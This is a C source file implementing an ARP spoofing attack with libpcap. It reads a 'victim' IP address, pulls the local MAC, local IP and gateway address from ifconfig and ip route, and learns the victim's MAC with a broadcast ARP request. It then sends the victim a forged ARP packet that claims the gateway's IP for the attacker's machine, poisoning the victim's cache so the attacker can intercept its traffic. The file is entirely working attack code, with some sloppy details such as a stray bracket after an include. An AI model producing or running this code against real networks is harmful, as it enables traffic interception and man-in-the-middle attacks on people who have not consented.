#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>]
#include <pcap.h>

#define PACKET_LEN sizeof(struct ether_header) + sizeof(struct ether_arp)

int main()
{
    FILE *ifp;
    unsigned char victim_mac[6];
    unsigned char victim_ip[4];
    unsigned char packet[100];
    char victim[100];
    char buff[500];
    char sip[100], sha[100], gate_ip[100];
    char cmd[1024];
    char errbuf[PCAP_ERRBUF_SIZE];
    char *device;
    arphdr ppp;
    int i;
    pcap_t *pcd;
    pcap_pkthdr *header;
    const unsigned char *pkt_data;

    printf("Input Victim Address : ");
    scanf("%s",victim);
    sscanf(victim,"%d.%d.%d.%d", &victim_ip[0], &victim_ip[1], &victim_ip[2], &victim_ip[3]);

    sprintf(cmd,"/sbin/ifconfig | grep \'HWaddr\'");  //get hardware mac address
    ifp=popen(cmd,"r");

    if(NULL==ifp)
    {
        perror("popen()...failed.\n");
        return 1;
    }

    fread((void *)buff, 1, 500, ifp);

    sscanf(buff+37,"%s",sha);
    //strncpy(sha,(buff+38),17);

    //printf("%s\n",sha);


    sprintf(cmd,"/sbin/ifconfig | grep \'inet addr\'");  //get my ip
    ifp=popen(cmd,"r");
    fread((void *)buff, 1, 500, ifp);

    //printf("%s\n",buff);

    sscanf(buff+20,"%s",sip);
    //strncpy(sip,(buff+20),15); // 20 = space and inet addr : , 15 = ip

    //printf("%s\n", sip);

    sprintf(cmd,"/sbin/ip route"); // get gateway ip
    ifp=popen(cmd,"r");
    fread((void *)buff, 1, 500, ifp);

    //printf("%s\n",buff);

    sscanf(buff+12,"%s",gate_ip);

    //strncpy(gate_ip,(buff+12),15);
    printf("%s\n",gate_ip);

    sscanf(sha,"%02x:%02x:%02x:%02x:%02x:%02x",&ppp.__ar_sha[0],&ppp.__ar_sha[1],&ppp.__ar_sha[2],&ppp.__ar_sha[3],&ppp.__ar_sha[4],&ppp.__ar_sha[5]);
    sscanf(sip,"%d.%d.%d.%d",&ppp.__ar_sip[0],&ppp.__ar_sip[1],&ppp.__ar_sip[2],&ppp.__ar_sip[3]);
    sscanf(gate_ip,"%d.%d.%d.%d",&ppp.__ar_tip[0],&ppp.__ar_tip[1],&ppp.__ar_tip[2],&ppp.__ar_tip[3]);

    device=pcap_lookupdev(errbuf);
    pcd = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);

    packet[0]=0xff; //broadcast
    packet[1]=0xff;
    packet[2]=0xff;
    packet[3]=0xff;
    packet[4]=0xff;
    packet[5]=0xff;

    for(i=6;i<12;++i)
    {
        packet[i]=ppp.__ar_sha[i-6];
    }

    packet[12]=0x08; //arp
    packet[13]=0x06;

    packet[14]=0x00; //ehternet
    packet[15]=0x01;

    packet[16]=0x08; //ipv4
    packet[17]=0x00;

    packet[18]=0x06; //hardware size

    packet[19]=0x04; //protocol size

    packet[20]=0x00; //request
    packet[21]=0x01;


    for(i=0;i<6;++i)
    {
        packet[22+i]=ppp.__ar_sha[i]; // source hardware address
    }

    for(i=0;i<4;++i)
    {
        packet[28+i]=ppp.__ar_sip[i]; // source protocol address
    }

    for(i=0;i<6;++i)
    {
        packet[32+i]=0x00; // broadcast
    }

    for(i=0;i<4;++i)
    {
        packet[38+i]=victim_ip[i]; // victim_ip
    }

    //for(int i = 0; i < 42 ; i++)
     //   printf("%s", packet[i]);

    printf("\n");

    pcap_sendpacket(pcd,packet,PACKET_LEN);

    int res;
    while((res=pcap_next_ex(pcd,&header, &pkt_data)) >= 0 )
    {
        if(res == 0)
            continue;

    if(memcmp((void *)pkt_data + sizeof(struct ether_header) + 14, (void *)victim_ip, 4)==0)
       {
            memcpy(victim_mac,pkt_data+sizeof(struct ether_header) + 8,6);

            for(i=0;i<4;++i)
            {
                packet[28+i]=ppp.__ar_tip[i]; // change source protocol address
            }

            for(i=0;i<6;++i)
            {
                packet[i]=victim_mac[i]; // change dst mac address
            }

            pcap_sendpacket(pcd,packet,PACKET_LEN);
        }
    }
    return 0;
}
